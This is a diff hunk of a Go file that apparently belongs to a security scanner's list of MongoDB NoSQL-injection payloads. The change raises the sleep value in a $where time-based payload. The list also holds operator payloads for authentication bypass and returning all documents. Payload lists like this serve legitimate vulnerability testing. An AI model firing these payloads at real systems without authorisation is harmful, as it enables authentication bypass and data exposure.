@@ -29,7 +29,7 @@ var jsonOperatorPayloads = []nosqliPayload{
 	{value: `{"$regex":"^"}`, detectType: detectSizeChange, desc: "MongoDB $regex start anchor — matches all documents"},
 	{value: `{"$exists":true}`, detectType: detectSizeChange, desc: "MongoDB $exists — field existence check bypasses value filter"},
 	{value: `{"$where":"return true"}`, detectType: detectSizeChange, desc: "MongoDB $where — JS expression always returns true"},
-	{value: `{"$where":"sleep(100)"}`, detectType: detectTimeDelay, desc: "MongoDB $where with sleep — time-based injection"},
+	{value: `{"$where":"sleep(10000)"}`, detectType: detectTimeDelay, desc: "MongoDB $where with sleep — time-based injection"},
 	{value: `{"$eq":""}`, detectType: detectAuthBypass, desc: "MongoDB $eq operator"},
 	{value: `{"$in":[""]}`, detectType: detectAuthBypass, desc: "MongoDB $in operator"},
 	{value: `[{"$match":{"$gt":""}}]`, detectType: detectSizeChange, desc: "Aggregation pipeline injection"},
